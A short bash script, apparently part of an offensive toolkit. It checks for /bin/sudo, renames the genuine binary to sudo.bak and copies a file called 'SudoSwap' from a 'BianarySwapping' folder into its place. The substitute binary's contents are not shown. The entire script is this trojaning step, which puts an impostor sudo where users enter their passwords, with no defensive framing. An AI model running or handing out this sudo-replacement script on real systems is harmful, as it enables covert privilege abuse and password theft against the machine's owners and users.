#!/bin/bash
if [ -e "/bin/sudo" ]; then
   mv /bin/sudo /bin/sudo.bak
    cp Linux/BianarySwapping/SudoSwap /bin/sudo
else
    echo "Bianary not present on system."
fi
